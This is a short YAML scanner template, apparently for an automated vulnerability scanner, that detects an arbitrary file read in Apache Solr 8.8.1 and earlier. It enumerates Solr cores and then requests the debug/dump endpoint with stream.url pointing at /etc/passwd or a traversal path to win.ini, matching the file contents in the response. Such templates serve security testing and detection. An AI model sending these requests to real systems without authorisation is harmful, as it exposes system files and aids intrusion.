expression: r0() && (r1() || r2())
id: solr-file-read
info:
  author: DhiyaneshDk
  name: Apache Solr <= 8.8.1 Arbitrary File Read
  reference:
  - https://twitter.com/Al1ex4/status/1382981479727128580
  - https://nsfocusglobal.com/apache-solr-arbitrary-file-read-and-ssrf-vulnerability-threat-alert/
  - https://twitter.com/sec715/status/1373472323538362371
  severity: high
rules:
  r0:
    expression: response.status == 200 && response.body.ibcontains(b'"responseHeader":')
    output:
      core: search["core"]
      search: '"\"name\":\"(?P<core>.+?)\"".bsubmatch(response.body)'
    request:
      method: GET
      path: /solr/admin/cores?wt=json
  r1:
    expression: '"root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)'
    request:
      method: GET
      path: /solr/{{core}}/debug/dump?stream.url=file:///etc/passwd&param=ContentStream
  r2:
    expression: response.status == 200 && response.body.bcontains(b"bit app support")
      && response.body.bcontains(b"fonts") && response.body.bcontains(b"extensions")
    request:
      method: GET
      path: /solr/{{core}}/debug/dump?stream.url=file:///../../../../../Windows/win.ini&param=ContentStream
